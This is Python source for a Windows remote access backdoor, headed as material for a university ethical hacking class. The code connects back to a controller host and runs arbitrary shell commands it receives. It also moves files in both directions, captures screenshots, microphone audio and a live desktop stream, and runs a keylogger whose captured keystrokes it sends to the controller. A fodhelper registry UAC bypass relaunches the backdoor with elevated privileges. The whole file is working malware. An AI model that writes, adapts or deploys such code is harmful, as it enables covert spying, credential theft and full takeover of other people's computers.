################################################
# Author: Watthanasak Jeamwatthanachai, PhD    #
# Class: SIIT Ethical Hacking, 2023-2024       #
################################################

# ---vvv--- CONFIGURE CONNECTION DETAILS ---vvv---
# Replace these with the static IP details from your Cloud Provider (e.g., Google Cloud).
HOST = '192.168.1.41'  # The static IP of your cloud VM
PORT = 5555              # The control port, should be 5555
# ---^^^------------------------------------^^^---


# Import necessary Python modules
import socket  # For network communication
import time  # For adding delays
import subprocess  # For running shell commands
import json  # For encoding and decoding data in JSON format
import os  # For interacting with the operating system
import base64
import mss
import sounddevice as sd
from scipy.io.wavfile import write as write_wav
import numpy as np
import cv2
import struct
import threading
import winreg  # For Windows registry manipulation
import sys
from pynput import keyboard
from datetime import datetime

# Global flag to control streaming
streaming = False

# Global keylogger variables
keylogger_active = False
keylogger_listener = None
captured_keys = []
keylog_lock = threading.Lock()

# Function to send data in a reliable way (encoded as JSON)
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send the encoded data over the network


# Function to receive data in a reliable way (expects JSON data)
def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()  # Receive data in chunks and decode
            return json.loads(data)  # Parse the received JSON data
        except ValueError:
            continue


# Function to establish a connection to a remote host
def connection():
    while True:
        time.sleep(5)  # Delay before retrying
        try:
            print(f"[*] Attempting connection to {HOST}:{PORT}...")
            # Connect to a remote host with the configured IP and Port
            s.connect((HOST, PORT))
            print("[+] Connection Established!")
            # Once connected, enter the shell() function for command execution
            shell()
            # Close the connection when done
            s.close()
            break
        except Exception as e:
            # Print connection errors for debugging
            print(f"[-] Connection failed to {HOST}:{PORT}: {e}. Retrying...")
            # If a connection error occurs, retry the connection
            continue


# Function to upload a file to the remote host
def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the specified file in binary read mode
    s.send(f.read())  # Read and send the file's contents over the network


# Function to download a file from the remote host
def download_file(file_name):
    f = open(file_name, 'wb')  # Open a file for binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received data to the file
        try:
            chunk = s.recv(1024)  # Receive the next chunk
        except socket.timeout as e:
            break
    s.settimeout(None)  # Reset the timeout setting
    f.close()  # Close the file when done


def stream_desktop(host, port):
    global streaming
    stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        stream_socket.connect((host, port))
        with mss.mss() as sct:
            while streaming:
                try:
                    # Get raw pixels from the screen
                    img = sct.grab(sct.monitors[1])
                    # Create an Image
                    img = np.array(img)
                    # Encode to JPEG
                    _, frame = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    # Pack the frame size and the frame itself
                    data = frame.tobytes()
                    size = struct.pack('>L', len(data))
                    # Send data
                    stream_socket.sendall(size + data)
                    # Small delay to prevent overwhelming the connection
                    time.sleep(0.033)  # ~30 FPS
                except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                    break # Server closed the connection
                except Exception as e:
                    # In a real scenario, you might want to log this error
                    time.sleep(0.1) # Avoid spamming a failing loop
                    continue
    except Exception as e:
        # Could not connect to stream server
        pass
    finally:
        try:
            stream_socket.close()
        except:
            pass
        streaming = False # Ensure flag is reset


# Keylogger functions
def on_key_press(key):
    """Handle key press events"""
    global captured_keys, keylog_lock
    
    try:
        with keylog_lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                # Regular character
                captured_keys.append(f"{key.char}")
            else:
                # Special keys
                key_name = str(key).replace('Key.', '')
                if key_name == 'space':
                    captured_keys.append(" ")
                elif key_name == 'enter':
                    captured_keys.append("\n")
                elif key_name == 'tab':
                    captured_keys.append("\t")
                elif key_name == 'backspace':
                    captured_keys.append("[BACKSPACE]")
                elif key_name == 'delete':
                    captured_keys.append("[DELETE]")
                elif key_name == 'shift' or key_name == 'shift_l' or key_name == 'shift_r':
                    pass  # Ignore shift keys to avoid spam
                elif key_name == 'ctrl_l' or key_name == 'ctrl_r':
                    captured_keys.append("[CTRL]")
                elif key_name == 'alt_l' or key_name == 'alt_r':
                    captured_keys.append("[ALT]")
                else:
                    captured_keys.append(f"[{key_name.upper()}]")
                    
            # Limit buffer size to prevent memory issues
            if len(captured_keys) > 1000:
                captured_keys = captured_keys[-500:]  # Keep last 500 keys
                
    except Exception as e:
        pass  # Silently handle errors


def start_keylogger():
    """Start the keylogger"""
    global keylogger_active, keylogger_listener, captured_keys
    
    if keylogger_active:
        return False, "Keylogger is already running"
    
    try:
        # Clear previous captures
        with keylog_lock:
            captured_keys.clear()
        
        # Start the listener
        keylogger_listener = keyboard.Listener(on_press=on_key_press)
        keylogger_listener.start()
        keylogger_active = True
        
        return True, "Keylogger started successfully"
    except Exception as e:
        return False, f"Failed to start keylogger: {str(e)}"


def stop_keylogger():
    """Stop the keylogger"""
    global keylogger_active, keylogger_listener
    
    if not keylogger_active:
        return False, "Keylogger is not running"
    
    try:
        if keylogger_listener:
            keylogger_listener.stop()
            keylogger_listener = None
        keylogger_active = False
        
        return True, "Keylogger stopped successfully"
    except Exception as e:
        return False, f"Failed to stop keylogger: {str(e)}"


def get_keylog_data():
    """Get captured keystrokes and clear the buffer"""
    global captured_keys, keylog_lock
    
    try:
        with keylog_lock:
            if not captured_keys:
                return ""
            
            # Join all captured keys into a string
            keylog_text = "".join(captured_keys)
            captured_keys.clear()  # Clear the buffer after reading
            
            return keylog_text
    except Exception as e:
        return f"Error retrieving keylog data: {str(e)}"


def get_keylogger_status():
    """Get current keylogger status"""
    global keylogger_active, captured_keys
    
    with keylog_lock:
        key_count = len(captured_keys)
    
    status = "Running" if keylogger_active else "Stopped"
    return f"Keylogger Status: {status} | Captured Keys: {key_count}"

# Main shell function for command execution
def shell():
    global streaming
    while True:
        # Receive a command from the remote host
        command_data = reliable_recv()
        if not isinstance(command_data, dict):
            continue # Skip malformed commands

        command = command_data.get('command')
        args = command_data.get('args')

        if command == 'quit':
            # If the command is 'quit', exit the shell loop
            if streaming:
                streaming = False # Stop stream on quit
            break
        elif command == 'clear':
            # If the command is 'clear', do nothing (used for clearing the screen)
            pass
        elif command == 'cd':
            # If the command starts with 'cd ', change the current directory
            try:
                if args:
                    os.chdir(args)
            except:
                pass
        elif command == 'download':
            # If the command starts with 'download', upload a file to the remote host
            upload_file(args)
        elif command == 'upload':
            # If the command starts with 'upload', download a file from the remote host
            download_file(args)
        elif command == 'screenshot':
            try:
                with mss.mss() as sct:
                    tmp_filename = 'screenshot.png'
                    sct.shot(output=tmp_filename)
                    upload_file(tmp_filename)
                    os.remove(tmp_filename)
            except Exception as e:
                pass
        elif command == 'record_audio':
            try:
                if args:
                    duration = int(args)
                    fs = 44100
                    tmp_filename = 'recording.wav'
                    
                    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype=np.int16)
                    sd.wait()
                    
                    write_wav(tmp_filename, fs, recording)
                    
                    upload_file(tmp_filename)
                    os.remove(tmp_filename)
            except Exception as e:
                pass
        elif command == 'start_stream':
            if not streaming:
                try:
                    if args:
                        address = args
                        host, port_str = address.split(':')
                        port = int(port_str)
                        streaming = True
                        stream_thread = threading.Thread(target=stream_desktop, args=(host, port), daemon=True)
                        stream_thread.start()
                except (ValueError, IndexError, TypeError):
                    pass # Invalid command format
        elif command == 'stop_stream':
            streaming = False
        elif command == 'escalate':
            # Attempt to spawn an elevated shell using fodhelper UAC bypass
            try:
                # Extract host and port from args (format: "host:port")
                if args:
                    target_host, target_port = args.split(':')
                    target_port = int(target_port)
                else:
                    # Use the current connection details
                    target_host = HOST
                    target_port = PORT
                
                success = spawn_elevated_shell(target_host, target_port)
                if success:
                    reliable_send("[+] Privilege escalation initiated. Check for new elevated connection.")
                else:
                    reliable_send("[-] Privilege escalation failed. UAC bypass may be patched or blocked.")
            except Exception as e:
                reliable_send(f"[-] Error during escalation: {str(e)}")
        elif command == 'run_elevated':
            # Run a single command with elevated privileges using fodhelper
            try:
                if args:
                    success = fodhelper_escalate(args)
                    if success:
                        reliable_send(f"[+] Command executed with elevated privileges: {args}")
                    else:
                        reliable_send("[-] Failed to execute command with elevated privileges.")
                else:
                    reliable_send("[-] Usage: run_elevated <command>")
            except Exception as e:
                reliable_send(f"[-] Error: {str(e)}")
        elif command == 'test_escalation':
            # Test if we can get admin privileges
            try:
                test_file = "C:\\Windows\\System32\\escalation_test.txt"
                test_cmd = f'echo "Admin test successful" > {test_file} && type {test_file} && del {test_file}'
                
                success = fodhelper_escalate(f'cmd.exe /c {test_cmd}')
                if success:
                    reliable_send("[+] Escalation test completed - check if file was created/deleted in System32")
                else:
                    reliable_send("[-] Escalation test failed")
            except Exception as e:
                reliable_send(f"[-] Error during test: {str(e)}")
        elif command == 'start_keylogger':
            # Start keylogger
            try:
                success, message = start_keylogger()
                reliable_send(f"[+] {message}" if success else f"[-] {message}")
            except Exception as e:
                reliable_send(f"[-] Error starting keylogger: {str(e)}")
        elif command == 'stop_keylogger':
            # Stop keylogger
            try:
                success, message = stop_keylogger()
                reliable_send(f"[+] {message}" if success else f"[-] {message}")
            except Exception as e:
                reliable_send(f"[-] Error stopping keylogger: {str(e)}")
        elif command == 'get_keylog':
            # Get captured keystrokes
            try:
                keylog_data = get_keylog_data()
                if keylog_data:
                    reliable_send(f"[+] Captured keystrokes:\n{keylog_data}")
                else:
                    reliable_send("[-] No keystrokes captured yet")
            except Exception as e:
                reliable_send(f"[-] Error retrieving keylog: {str(e)}")
        elif command == 'keylog_status':
            # Get keylogger status
            try:
                status = get_keylogger_status()
                reliable_send(f"[+] {status}")
            except Exception as e:
                reliable_send(f"[-] Error getting keylogger status: {str(e)}")
        else:
            # For other commands, execute them using subprocess
            if command:
                # Re-join args for commands with spaces
                full_command = command
                if args:
                    full_command += f" {args}"
                execute = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = execute.stdout.read() + execute.stderr.read()  # Capture the command's output
                result = result.decode()  # Decode the output to a string
                # Send the command execution result back to the remote host
                reliable_send(result)


# Function to perform UAC bypass using fodhelper technique (Windows 10/11)
def fodhelper_escalate(command_to_run):
    """
    Bypass UAC using fodhelper.exe vulnerability on Windows 10/11
    This exploits the auto-elevation capability of fodhelper.exe
    """
    try:
        # Registry key path that fodhelper.exe queries
        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        # Create registry structure
        try:
            # Create the registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            # Set the default value to the command we want to run with elevated privileges
            winreg.SetValue(key, "", winreg.REG_SZ, command_to_run)
            
            # Create DelegateExecute value (needs to exist but be empty)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            winreg.CloseKey(key)
            
            # Execute fodhelper.exe - it will run our command with elevated privileges
            # Using subprocess to start fodhelper silently
            subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"], 
                            shell=True, 
                            stdout=subprocess.PIPE, 
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
            
            # Wait a moment for fodhelper to execute
            time.sleep(2)
            
            # Clean up - remove the registry key
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\command")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\Shell\Open")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path + r"\Shell")
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass  # Cleanup errors are not critical
                
            return True
            
        except Exception as e:
            return False
            
    except Exception as e:
        return False


# Function to spawn elevated reverse shell using fodhelper
def spawn_elevated_shell(host, port):
    """
    Create a new elevated reverse shell connection using fodhelper UAC bypass
    """
    try:
        # Path to the current Python executable and script
        python_path = sys.executable
        script_path = os.path.abspath(__file__)
        
        # Command to run another instance of this backdoor with elevated privileges
        # Using pythonw.exe if available to run without window
        if os.path.exists(python_path.replace('python.exe', 'pythonw.exe')):
            python_cmd = python_path.replace('python.exe', 'pythonw.exe')
        else:
            python_cmd = python_path
            
        # Build the command to run the backdoor elevated
        elevated_cmd = f'"{python_cmd}" "{script_path}"'
        
        # Use fodhelper to execute the command with elevated privileges
        return fodhelper_escalate(elevated_cmd)
        
    except Exception as e:
        return False


# Create a socket object for communication over IPv4 and TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Start the connection process by calling the connection() function
connection()